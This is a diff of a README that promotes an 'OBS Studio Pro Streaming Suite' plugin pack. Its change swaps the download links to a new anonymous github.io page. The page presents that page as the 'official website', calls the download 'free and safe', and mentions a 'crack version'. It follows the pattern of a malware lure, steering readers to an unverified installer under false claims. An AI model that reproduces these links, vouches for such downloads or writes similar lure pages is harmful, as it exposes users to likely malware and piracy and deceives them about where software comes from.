@@ -2,7 +2,7 @@
 
 Welcome to the OBS Studio Pro Streaming Suite, the ultimate collection of plugins and tools designed to elevate your streaming experience. This package includes the obs studio plugins pack 2026, offering advanced features for professional content creators who want to enhance their videos with minimal effort.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -48,6 +48,6 @@ A: Updates are released regularly, typically every few months, to add new featur
 
 To get started with the OBS Studio Pro Streaming Suite, use the direct link below. This package includes everything you need to enhance your streaming setup with professional-grade tools.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 The download is free and safe, with no additional software bundled. For advanced users, we also offer a crack version for those seeking extended features, but we recommend the official release for stability and support. Enjoy your enhanced OBS Studio experience!
